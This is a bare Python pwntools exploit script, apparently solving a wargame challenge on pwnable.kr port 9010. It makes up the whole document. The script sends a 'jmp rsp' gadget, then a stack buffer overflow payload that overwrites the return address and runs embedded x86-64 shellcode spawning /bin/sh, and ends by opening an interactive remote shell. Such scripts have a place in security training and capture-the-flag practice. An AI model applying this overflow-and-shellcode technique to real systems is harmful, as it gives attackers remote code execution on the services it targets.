from pwn import *

context.log_level = 'debug'
context(arch='amd64', os='linux')

sc = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
fd = remote("pwnable.kr",9010)

fd.recvuntil("hey, what's your name? :")
fd.sendline(asm('jmp rsp'))
fd.recvuntil("> ")
fd.sendline("1")
fd.recvuntil("hello ")
fd.sendline("A"*0x20 + "BBBBBBBB" + p64(0x6020A0) + sc)

fd.interactive()
